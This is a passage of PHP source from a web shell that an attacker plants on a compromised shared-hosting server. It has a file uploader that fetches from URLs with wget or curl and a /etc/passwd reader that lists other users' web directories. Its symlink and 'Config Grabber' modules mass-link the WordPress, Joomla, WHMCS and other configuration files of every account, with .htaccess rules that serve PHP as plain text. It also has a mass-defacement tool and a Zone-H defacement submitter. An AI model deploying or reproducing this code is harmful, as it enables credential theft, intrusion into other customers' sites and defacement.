	<center><b><font size=5 style=italic color=#00ff00>Uploader</font></b></center></td></tr></table>
";
if(isset($_POST['uploadcomp'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;
		$stat = @move_uploaded_file($tmp_name,$pindah);		
		if ($stat) {
			$msg = "file uploaded to $pindah";
		}
		else $msg = "failed to upload $fname";
	}
	else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl'])){@ini_set('output_buffering',0); 
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$path = magicboom($_POST['path']);
	$namafile = download($pilihan,$wurl);
	$pindah = $path.$namafile;
	if(is_file($pindah)) {
		$msg = "file uploaded to $pindah";
	}
	else $msg = "failed to upload $namafile";

}
?>
<form action="?y=<?=$pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"><table class="tabnet" style="width:320px;padding:0 1px;"><tr><th colspan="2"><b>Upload From Computer</b></th></tr><tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?=$pwd; ?>" /></td></tr>
</tr></table></form><table class="tabnet" style="width:320px;padding:0 1px;"><tr><th colspan="2"><b>Upload From URL</b></th></tr><tr><td colspan="2"><form method="post" style="margin:0;padding:0;" action="?y=<?=$pwd; ?>&amp;x=upload">
<table><tr><td>Url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?=$pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan"><option value="wwget">Wget</option><option value="wlynx">Lynx</option><option value="wfread">Fread</option><option value="wfetch">Fetch</option><option value="wlinks">Links</option><option value="wget">Get</option><option value="wcurl">Curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr></table><div style="text-align:center;margin:2px;"><?=$msg; ?></div>
<?php }
////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping')){ @ini_set('output_buffering',0); 
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Jumping</font></b></center></td></tr></table>
";
?>
    <form action="?y=<?=$pwd; ?>&x=jumping" method="post">
	<?php
	echo "<table class=\"cmdbox\"><tr><td colspan=\"2\">"; 
($sm = ini_get('safe_mode') == 0) ? 
$sm = 'off': die("<b><blink><font style='color:#ff0000'>[-] ERROR</font></blink>&nbsp;: &nbsp;&nbsp;Safe_mode = On </b></td></tr></table>");
 
set_time_limit(0);
echo "<table class=\"cmdbox\"><tr><td colspan=\"2\">";  
@$passwd = fopen('/etc/passwd','r'); 
if (!$passwd) { die ("<b><blink><font style='color:#ff0000'>[-] ERROR</font></blink>&nbsp; : &nbsp;&nbsp; I Can't Read [ /etc/passwd ]</b></td></tr></table>
<br><br><br><br><center><div class=\"info\"><b></div> 
<br><br><div class=\"jaya\"> &copy; ".date('Y',time())." Security Exploded </b></div></center>"); }
$pub = array(); 
$users = array(); 
$conf = array(); 
$i = 0; 

while(!feof($passwd)){ 
$str = fgets($passwd); 
if ($i > 100){ $pos = strpos($str,':'); 
$username = substr($str,0,$pos); 
$dirz = '/home/'.$username.'/public_html/'; 
if (($username != '')){ if (is_readable($dirz)){ array_push($users,$username); 
array_push($pub,$dirz); } } } $i++; } 
foreach ($users as $user){ 
echo '
<table><tr><td>[Found !]</td>
	<td><a href="?y=/home/'.$user.'/public_html">/home/'.$user.'/public_html/</a><td></tr>'; } 
 echo "</table>";
 } 


/////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{	@ini_set('output_buffering',0); 
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Multi Tool Symlink</font></b></center></td></tr></table>
";
?>
<form action="?y=<?=$pwd; ?>&amp;x=symlink" method="post">
<form method='post'><center><table class='tabnet'><tr><th colspan='5'><b>Multi Tool Symlink</b></th></tr><tr><th><b>Manual Symlink</b></th><th><b>Auto Symlink</b></th><th><b>Domain Viewer</b></th></tr><tr><td><input class='inputzbut' type='submit'name='symlinkr' value="Manual Symlink" /></td><td><input class='inputzbut' type='submit'name='symlinks' value="Auto Symlink" /></td><td><input class='inputzbut' type='submit' name='domain' value="Domain Viewer" /></td></tr></table></center></form><br><hr><br><br>
<?php 

#==================[ Multi Tool Symlink ]==================#

if(isset($_POST['domain']))
{
   ?>
    <form action="?y=<?=$pwd; ?>&x=dv" method="post">
	<center><h2>[ Domain Viewer by ]<br>Notes: If Blank(No Domain) That Mean Not Work Use Domain Viewer, You Can Use Auto Symlink Server</center><br><br>
	<?php
	function openBaseDir()
{
$openBaseDir = ini_get("open_basedir");
if (!$openBaseDir)
    {
        $openBaseDir = '<font color="green">OFF</font>';
    }
    else 
    {
        $openBaseDir = '<font color="red">ON</font>';
    }    
    return $openBaseDir;
}


echo '
    <table width="95%" cellspacing="0" cellpadding="0" class="td1" >
    <td height="100" align="left" class="td1">';
    $pg = basename(__FILE__);
    $safe_mode = @ini_get('safe_mode');
    $dir = @getcwd();
	////////////////////////////////////////////////////
	// LET'S PLAY ~
	##.htaccess
@mkdir('explodedsym',0777);
@symlink("/","explodedsym/root");
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
 
file_put_contents("explodedsym/.htaccess",$htaccss);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);


##Symlink to the ROOT :p
foreach($etcz as $etz){
$etcc = explode(":",$etz);
error_reporting(0);

$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);

symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp-config.php',"explodedsym/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/blog/wp-config.php',"explodedsym/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/wp/wp-config.php',"explodedsym/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/wp-config.php',"explodedsym/".$etcc[0].'-WordPress.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/config.php',"explodedsym/".$etcc[0].'-PhpBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/config.php',"explodedsym/".$etcc[0].'-vBulletin.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/configuration.php',"explodedsym/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/web/configuration.php',"explodedsym/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/joomla/configuration.php',"explodedsym/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/site/configuration.php',"explodedsym/".$etcc[0].'-Joomla.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/conf_global.php',"explodedsym/".$etcc[0].'-IPB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/inc/config.php',"explodedsym/".$etcc[0].'-MyBB.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/Settings.php',"explodedsym/".$etcc[0].'-SMF.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/sites/default/settings.php',"explodedsym/".$etcc[0].'-Drupal.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/e107_config.php',"explodedsym/".$etcc[0].'-e107.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/datas/config.php',"explodedsym/".$etcc[0].'-Seditio.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/includes/configure.php',"explodedsym/".$etcc[0].'-osCommerce.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/client/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientes/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/support/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/supportes/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmcs/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domain/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/hosting/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/whmc/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/billing/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/portal/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/order/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/clientarea/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
symlink('/'.$dir[1].'/'.$etcc[0].'/'.$dir[3].'/domains/configuration.php',"explodedsym/".$etcc[0].'-WHMCS.txt');
}
#############################
	if(is_readable("/var/named")){
	echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
	echo'<tr><td><center><b>SITE</b></center></td><td>
	<center><b>USER</b></center></td>
	<td></center><b>SYMLINK</b></center></td>';
	$list = scandir("/var/named");
	foreach($list as $domain){
	if(strpos($domain,".db")){
	$i += 1;
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));

	echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
	<td class='td1'><center><font color='red'>".$owner['name']."</font></center></td>
	<td class='td1'><center><a href='explodedsym/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
		}
	}
	echo "<center>Total Domains Found: ".$i."</center><br />";
	}else{ 
	echo "<tr><td class='td1'>can't read [ /var/named ]</td><tr>"; }

break;

##################################
error_reporting(0);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
if(is_readable("/etc/passwd")){

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>SYMLINK</b></center></td>';

$list = scandir("/var/named");

foreach($etcz as $etz){
$etcc = explode(":",$etz);

foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $etcc[0])
{
$i += 1;
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><center>
<td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='explodedsym/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}}}}
echo "<center>Total Domains Found: ".$i."</center><br />";}

break;
###############################
if(is_readable("/etc/named.conf")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>SYMLINK</b></center></td>';
$named = file_get_contents("/etc/named.conf");
preg_match_all('%zone \"(.*)\" {%',$named,$domains);
foreach($domains[1] as $domain){
$domain = trim($domain);
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td><td class='td1'><center><font color='red'>".$owner['name']."</font></center></td><td class='td1'><center><a href='explodedsym/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";

} else { echo "<tr><td class='td1'>can't read [ /etc/named.conf ]</td></tr>"; }

break;
############################
if(is_readable("/etc/valiases")){
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td>
<center><b>USER</b></center></td><td></center>
<b>SYMLINK</b></center></td>';
$list = scandir("/etc/valiases");
foreach($list as $domain){
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
echo "<tr><td class='td1'><a href='http://".$domain." '>".$domain."</a></td>
<center><td class='td1'><font color='red'>".$owner['name']."</font></center></td>
<td class='td1'><center><a href='explodedsym/root".$owner['dir']."/".$dir[3]."' target='_blank'>DIR</a></center></td>";
}
echo "<center>Total Domains Found: ".$i."</center><br />";
} else { echo "<tr><td class='td1'>can't read [ /etc/valiases ]</td></tr>"; }

break;
}

##################################

#==================[ Multi Tool Symlink ]==================#

if(isset($_POST['symlinkr']))
{
@set_time_limit(0);
@mkdir('sym',0777);
error_reporting(0);
$htaccess  = "Options all \n DirectoryIndex gaza.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$op =@fopen ('sym/.htaccess','w');
fwrite($op ,$htaccess);
echo '<center><b>[ Manual Symlink ]</b><br><br>
<form method="post"><table class="tabnet"><th colspan="5">Manual Symlink</th><tr>
<td>File Path &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</td><td><input class="inputz" type="text" name="file" value="/home/user/public_html/config.php" size="60"/></td></tr>
<tr><td>Symlink Name :</td><td><input class="inputz" type="text" name="symfile" value="config.txt" size="60"/></td></tr>
<tr><td></td><td><input class="inputzbut" type="submit" value="Symlink" name="symlink" /></td></tr></table></form></center>';
$target = $_POST['file']; $symfile = $_POST['symfile']; $symlink = $_POST['symlink'];
if ($symlink) {@symlink("$target","sym/$symfile");
echo '<br><center><a target="_blank" href="sym/'.$symfile.'" >'.$symfile.'</a><center>';}}

#==================[ Multi Tool Symlink ]==================#
  
if(isset($_POST['symlinks']))
{
@set_time_limit(0);
echo "<center><h1>[ Auto Symlink Server]</h1></center><br><center><div class=content>";
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("explodedsyms",0777);
@chdir("explodedsyms");
@exe("ln -s / root");
$file3 = 'Options all
DirectoryIndex Sux.html
AddType text/plain .php 
AddHandler server-parsed .php 
AddType text/plain .html 
AddHandler txt .html 
Require None 
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=3>S. No.</font></td>
<td align=center><font size=3>Domains</font></td>
<td align=center><font size=3>Users</font></td>
<td align=center><font size=3>Symlink</font></td>
</tr>";
$dcount = 1;

foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=3>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='/k2/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("explodedsyms",0777);
@chdir("explodedsyms");
exe("ln -s / root");
$file3 = 'Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "<br><br><center><h2>Symlink Server !</h2></center><br><br>
 <table align=center border=1><tr>
 <td align=center><font size=4>S. No.</font></td>
 <td align=center><font size=4>Users</font></td>
 <td align=center><font size=4>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=3>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("explodedsyms",0777);@chdir("explodedsyms");@exe("ln -s / root");$file3 = 'Options all 
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "<center>
 <table align=center border=1><tr>
 <td align=center><font size=4>Id</font></td>
 <td align=center><font size=4>Users</font></td>
 <td align=center><font size=4>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=3>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=4>Cannot create Symlink</font></center>";
 }
 }
 }
}
/////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////


elseif(isset($_GET['x']) && ($_GET['x'] == 'mass'))
{
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Mass Deface</font></b></center></td></tr></table>
";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >

<th colspan='5'><b>Folder Mass Deface</b></th>
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' style='background:black;' type='text' name='path' size='60' value="<?=getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>File Name</td><td><input class ='inputz' style='background:black;' type='text' name='file' size='60' value="index.html"></td>
	</tr>
</tr>
<table class="tabnet" >
<th colspan='5'><b>File Code Mass Deface</b></th>
<tr><td></td><td>
<table><textarea align="center" style='background:black;' name='index' rows='15' cols='80'><?=$script_deface; ?></textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Mass Deface&nbsp;&nbsp;"></center></form></table></table></table></table>
<br></form>
<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file > Done<br><br>";}}}
/////////////
/////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'zone'))
{	@ini_set('output_buffering',0); 
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Zone-H Submiter</font></b></center></td></tr></table>
";
?>
<form action="?y=<?=$pwd; ?>&amp;x=zone" method="post">

<br><br><center>
<!-- Zone-H -->
<form action="" method='POST'><table><table class='tabnet'>
<td style='background-color:#0000;padding-left:10px;'><tr><tr><th colspan="2"><b>Zone-H Defacer</b></th></tr></td></tr><td height='45' colspan='2'><form method="post">
<input type="text" class="inputz" name="defacer" style="background:black;" placeholder="Name Of Defacer" />
<select name="hackmode" class="inputz" >
<option >---------------------------Select One---------------------------</option>
<option value="1">Known Vulnerability (i.e. Unpatched System)</option>
<option value="2" >Undisclosed (new) Vulnerability</option>
<option value="3" >Configuration / Admin Mistake</option>
<option value="4" >Brute Force Attack</option>
<option value="5" >Social Engineering</option>
<option value="6" >Web Server Intrusion</option>
<option value="7" >Web Server External Module Intrusion</option>
<option value="8" >Mail Server Intrusion</option>
<option value="9" >FTP Server Intrusion</option>
<option value="10" >SSH Server Intrusion</option>
<option value="11" >Telnet Server Intrusion</option>
<option value="12" >RPC Server Intrusion</option>
<option value="13" >Shares Misconfiguration</option>
<option value="14" >Other Server Intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application Bug</option>
<option value="19" >Remote Administrative Panel Access Bruteforcing</option>
<option value="20" >Remote Administrative Panel Access Password Guessing</option>
<option value="21" >Remote Administrative Panel Access Social Engineering</option>
<option value="22" >Attack Against Administrator(Password StealingSniffing)</option>
<option value="23" >Access Credentials Through Man In the Middle Attack</option>
<option value="24" >Remote Service Password Guessing</option>
<option value="25" >Remote Service Password Bruteforce</option>
<option value="26" >Rerouting After Attacking The Firewall</option>
<option value="27" >Rerouting After Attacking The Router</option>
<option value="28" >DNS Attack Through Social Engineering</option>
<option value="29" >DNS Attack Through Cache Poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason" class="inputz" >
<option >---------------Select One-----------------</option>
<option value="1" >Heh...Just For Fun!</option>
<option value="2" >Revenge Against That Website</option>
<option value="3" >Political Reasons</option>
<option value="4" >As a Challenge</option>
<option value="5" >I Just Want To Be The Best Defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not Available</option>
</select>
<input type="hidden" name="action" value="zone"><tr><td>
<center><textarea style="background:black;outline:none;" name="domain" cols="116" rows="9" id="domains" placeholder="List Of Domains"></textarea>
<br /><input class='inputzbut' type="submit" value="Send Now !" name="SendNowToZoneH" /><br></center></table>
</form></td></tr></table></form>
<!-- End Of Zone-H -->
</td></center><br><br>

<?php
function ZoneH($url, $hacker, $hackmode,$reson, $site ) 
{ 
    $k = curl_init(); 
    curl_setopt($k, CURLOPT_URL, $url); 
    curl_setopt($k,CURLOPT_POST,true); 
    curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson); 
    curl_setopt($k,CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($k, CURLOPT_RETURNTRANSFER, true); 
    $kubra = curl_exec($k); 
    curl_close($k); 
    return $kubra; 
} 
{ 
                ob_start(); 
                $sub = @get_loaded_extensions(); 
                if(!in_array("curl", $sub)) 
                { 
                    die('<center><b>[-] Curl Is Not Supported !![-]</b></center>'); 
                } 
             
                $hacker = $_POST['defacer']; 
                $method = $_POST['hackmode']; 
                $neden = $_POST['reason']; 
                $site = $_POST['domain']; 
                if (empty($hacker)) 
                { die ("<center><b> </b></center>"); } 
                elseif($method == "--------SELECT--------")  
                { die("<center><b>[+] YOU MUST SELECT THE METHOD [+]</b></center>"); } 
                elseif($neden == "--------SELECT--------")  
                {  die("<center><b>[+] YOU MUST SELECT THE REASON [+]</b></center>"); } 
                elseif(empty($site))  
                { die("<center><b>[+] YOU MUST INTER THE SITES LIST [+]</b></center>"); } 
                $i = 0; 
                $sites = explode("\n", $site); 
                while($i < count($sites))  
                { 
                    if(substr($sites[$i], 0, 4) != "http")  
                    { 
                        $sites[$i] = "http://".$sites[$i]; 
                    } 
                    ZoneH("http://www.zone-h.com/notify/single", $hacker, $method, $neden, $sites[$i]); 
                     echo "$sites[$i]"; 
                    ++$i; 
                } 

            } 

	
}
/////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'grabc')){ @ini_set('output_buffering',0); 
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Config Grabber</font></b></center></td></tr></table>
";
?>
    <form action="?y=<?=$pwd; ?>&x=grabc" method="post">

<?php
echo "
<form method='POST'>
</head>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;  
font-size:8pt; color:#ffffff;

width:550px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
echo "<center>";?></center><br><center><?php if (empty($_POST['config'])) { ?><br><form method="POST"><table class="tabnet" >
<th colspan='5'><b>Config Grabber</b></th></center>
<tr><td></td><td><table><textarea name="passwd" class='area' rows='15' cols='60'><?=file_get_contents('/etc/passwd'); ?></textarea><br>
<center><input name="config" style="width:550px;" class='inputzbut' value="&nbsp;&nbsp;Grab!&nbsp;&nbsp;" type="submit"></form></center></table></table>
<?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}@mkdir('explodedcgrab', 0755);@chdir('explodedcgrab');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
$passwd=explode("\n",$passwd);
echo "<br><br><center><font color=#b0b000 size=2pt>wait ...</center><br>";
foreach($passwd as $pwd){
$pawd=explode(":",$pwd);$user =$pawd[0];
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
